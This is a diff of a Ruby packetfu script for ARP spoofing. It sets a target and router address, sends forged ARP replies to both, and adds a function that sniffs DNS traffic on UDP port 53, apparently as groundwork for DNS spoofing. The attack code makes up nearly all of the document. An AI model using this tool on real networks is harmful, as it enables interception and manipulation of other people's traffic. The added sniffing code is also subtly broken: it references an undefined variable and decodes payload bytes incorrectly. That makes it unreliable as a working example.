@@ -4,10 +4,13 @@ require 'packetfu'
 require 'thread'
 require 'macaddr'
 
-### User Defined ###
+### User Defined ###############################
+
 target_ip = '192.168.0.9'
 router_ip = '192.168.0.100'
-###              ###
+
+################################################
+
 # Get the mac addresses for all the necessary machines.
 sender_mac = Mac.addr
 `ping -c 1 #{target_ip}`
@@ -49,6 +52,19 @@ def runspoof(arp_packet_target,arp_packet_router)
     arp_packet_target.to_w(@interface)
     arp_packet_router.to_w(@interface)
   end
+end
+
+# Opens up the nic for capture.
+def sniff(iface)
+  pp 'Sniffing...'
+  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
+  cap.stream.each do |p|
+    pp 'Got one!'
+    packet = Packet.parse p
+    $dnsQuery = packet.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
+  end
+
+
 end
 
 begin
